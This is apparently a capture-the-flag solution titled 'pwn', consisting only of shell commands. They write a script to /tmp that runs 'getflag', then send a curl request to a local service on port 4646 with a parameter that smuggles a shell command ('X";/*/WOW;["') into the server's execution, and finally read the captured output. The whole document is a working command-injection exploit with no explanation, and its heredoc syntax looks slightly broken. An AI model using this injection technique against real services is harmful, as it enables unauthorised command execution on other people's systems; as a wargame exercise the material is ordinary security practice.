# pwn

```bash
cat <<EOF
#!/bin/bash
getflag >> /tmp/ptdr
EOF > /tmp/WOW

chmod +x /tmp/WOW

curl localhost:4646 -G --data-urlencode 'x=X";/*/WOW;["'

cat /tmp/ptdr
```
